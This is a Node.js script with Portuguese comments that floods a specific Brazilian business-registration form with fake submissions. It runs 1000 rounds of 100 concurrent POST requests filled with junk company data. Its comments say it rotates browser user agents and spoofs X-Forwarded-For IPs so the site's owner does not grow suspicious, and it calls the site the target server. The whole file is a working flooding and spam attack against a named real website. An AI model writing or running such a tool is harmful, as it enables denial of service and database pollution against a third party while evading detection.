import fetch from "node-fetch";

const MAX_REQUESTS = 100; // Reduzido para testar melhor no meu pc
const TOTAL_ROUNDS = 1000;
const DELAY_BETWEEN_ROUNDS = 100;

// simular os navegadores pro produções ferreira(ou produtora, sei la) não desconfiar
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
];

// Função para gerar um IP aleatório (simula usuários diferentes)
function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

async function requestSite() {
    try {
        const formData = new URLSearchParams();
        
        formData.append("campoconf", "OK");
        formData.append("nome", `teste${Date.now()}`);
        formData.append("proprietario", `teste${Date.now()}`);
        formData.append("razao_social", `Empresa${Date.now()}`);
        formData.append("cnpj", "12345678");
        formData.append("endereco", "Rua X");
        formData.append("numero", "100");
        formData.append("bairro", "Centro");
        formData.append("cidade", "São Paulo");
        formData.append("cep", "01010101");
        formData.append("fone1", "11999999999");
        formData.append("fone2", "11888888888");
        formData.append("email", `teste${Date.now()}@gmail.com`);
        formData.append("site", `www.teste${Date.now()}.com`);
        formData.append("descricao", "Essa é uma descrição de teste.");
        formData.append("destaque", "sim");
        formData.append("tipo", "c");

        const url = `https://sitedemonte.com.br/cadastrar/cadastrar_send.asp?nocache=${Date.now()}`;

        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                "X-Forwarded-For": generateRandomIP(), 
                "Referer": "https://sitedemonte.com.br/cadastrar/cadastro_comercial.asp", 
                "Origin": "https://sitedemonte.com.br",
                "Cookie": ""
            },
            body: formData.toString()
        });

        const text = await response.text();
        console.log('Resposta do servidor:', text);
    } catch (error) {
        console.error('Erro no servidor alvo:', error);
    }
}

async function flood() {
    for (let round = 0; round < TOTAL_ROUNDS; round++) {
        console.log(`Rodada ${round + 1} - Enviando ${MAX_REQUESTS} REQ`);

        const requests = Array.from({ length: MAX_REQUESTS }, () => requestSite());
        await Promise.all(requests);

        console.log(`Rodada ${round + 1} concluída`);
        await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_ROUNDS));
    }

    console.log('Teste finalizado');
}

flood();
